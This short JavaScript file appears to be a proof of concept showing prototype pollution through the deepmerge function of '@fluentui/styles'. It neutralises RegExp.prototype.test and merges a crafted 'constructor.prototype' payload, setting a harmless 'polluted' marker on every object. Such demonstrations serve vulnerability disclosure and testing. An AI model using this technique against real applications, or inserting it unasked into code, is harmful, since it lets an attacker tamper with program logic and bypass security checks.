RegExp.prototype.test = () => true;
const styles = require('@fluentui/styles');
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
const source2 = { k3: {} };
console.log({}.polluted);
let x = styles.deepmerge(source2, JSON.parse(malicious_payload));
console.log({}.polluted);